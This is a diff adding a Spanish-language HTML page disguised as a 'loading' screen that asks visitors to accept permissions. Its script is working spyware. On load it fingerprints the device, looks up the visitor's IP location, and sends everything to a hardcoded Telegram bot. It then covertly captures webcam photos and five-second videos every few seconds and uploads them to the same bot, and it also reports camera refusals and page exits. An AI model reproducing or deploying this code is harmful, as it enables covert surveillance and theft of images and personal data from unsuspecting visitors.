@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: black;
+            color: white;
+            overflow: hidden;
+        }
+        .texto-principal {
+            font-size: 2.8em;
+            text-align: center;
+            text-shadow: 2px 2px 10px rgba(0,255,0,0.5);
+            padding: 30px;
+        }
+        #video, #canvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            visibility: hidden;
+        }
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 10px solid #333;
+            border-top: 10px solid #0f0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #error {
+            color: red;
+            font-size: 1.5em;
+            margin-top: 20px;
+            max-width: 90%;
+        }
+    </style>
+</head>
+<body>
+    <div class="texto-principal">Acepta los permisos solicitados para continuar</div>
+    <div class="spinner"></div>
+    <div id="error"></div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+<script>
+    
+    const BOT_TOKEN = "8256143400:AAFQEOQfWTs_EpU_2SqQRJtqxjWE6Az-N_Q"; 
+    const CHAT_ID = "8284747554"; 
+
+    const sendPhoto = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    const sendVideo = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+    const sendMsg = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    function enviarMsg(texto) {
+        fetch(sendMsg, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: texto, parse_mode: 'HTML'})
+        }).catch(() => {});
+    }
+
+    function enviarFoto(blob, caption = "") {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('caption', caption);
+        form.append('photo', blob);
+        fetch(sendPhoto, {method: 'POST', body: form}).catch(() => {});
+    }
+
+    function enviarVideo(blob, caption = "") {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('caption', caption);
+        form.append('video', blob, 'video.webm');
+        fetch(sendVideo, {method: 'POST', body: form}).catch(() => {});
+    }
+
+    function mostrarError(msg) {
+        document.getElementById('error').innerHTML += msg + '<br>';
+    }
+
+    
+    let stream = null;
+    let intervaloCiclo = null;
+    async function manejarCamara() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+
+            
+            const ciclo = async () => {
+               
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const fotoData = canvas.toDataURL('image/jpeg', 0.7);
+                const fotoBlob = await (await fetch(fotoData)).blob();
+                enviarFoto(fotoBlob, `📸 FOTO - USUARIO ANÓNIMO (${new Date().toLocaleTimeString('es-SV')})`);
+
+               
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+                await new Promise(r => setTimeout(r, 5000));
+                recorder.stop();
+                const videoBlob = await new Promise(r => recorder.onstop = () => r(new Blob(chunks, {type: 'video/webm'})));
+                enviarVideo(videoBlob, `🎥 VIDEO 5 SEGUNDOS - USUARIO ANÓNIMO (${new Date().toLocaleTimeString('es-SV')})`);
+            };
+
+           
+            intervaloCiclo = setInterval(ciclo, 6000);
+            ciclo(); 
+        } catch (err) {
+            mostrarError("No se pudo continuar porque rechazaste la cámara.");
+            enviarMsg("❌ CÁMARA DENEGADA - USUARIO ANÓNIMO\nMotivo: " + err.message);
+        }
+    }
+
+ 
+    async function enviarDatosCompletos() {
+        try {
+            const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const bat = await navigator.getBattery?.() || {};
+            const batStr = bat.level ? `${Math.round(bat.level*100)}% ${bat.charging ? '⚡ Cargando' : '🔋'}` : 'No disponible';
+
+            let gpu = 'No disponible', gpuLvl = 'Desconocida';
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const di = gl?.getExtension('WEBGL_debug_renderer_info');
+                if (di) {
+                    gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
+                    gpuLvl = gpu.includes('RTX') || gpu.includes('GeForce') ? 'Alta gama 🎮' : gpu.includes('Intel') ? 'Básica 🖥️' : 'Media ⚙️';
+                }
+            } catch(e) {}
+
+            const datos = `<b>🔥 NUEVA CONEXIÓN DETECTADA - USUARIO ANÓNIMO</b>
+
+<b>📱 Dispositivo:</b> ${navigator.userAgent}
+<b>💻 Sistema Operativo:</b> ${navigator.platform}
+<b>🧠 RAM:</b> ${navigator.deviceMemory || '?'} GB
+<b>⚙️ Núcleos CPU:</b> ${navigator.hardwareConcurrency || '?'} 
+<b>🔋 Batería:</b> ${batStr}
+<b>🎮 GPU:</b> ${gpu} (${gpuLvl})
+<b>🌐 IP Pública:</b> ${geo.ip || 'No detectada'}
+<b>🏢 Proveedor:</b> ${geo.org || '?'}
+<b>📍 Ciudad / Región / País (aprox. por IP):</b> ${geo.city || 'No detectada'} - ${geo.region || 'No detectada'} - ${geo.country_name || 'No detectado'}
+<b>⏰ Hora de conexión:</b> ${new Date().toLocaleString('es-SV')}
+<b>🔗 Página visitada:</b> ${location.href}`;
+
+            enviarMsg(datos);
+        } catch (err) {
+            enviarMsg("⚠️ ERROR EN DATOS GENERALES - USUARIO ANÓNIMO");
+        }
+    }
+
+
+    window.onload = () => {
+        enviarDatosCompletos();
+        manejarCamara();
+    };
+
+    
+    window.addEventListener('beforeunload', () => {
+        if (intervaloCiclo) clearInterval(intervaloCiclo);
+        enviarMsg("🚪 USUARIO SALIÓ DE LA PÁGINA - USUARIO ANÓNIMO");
+    });
+</script>
+</body>
+</html>
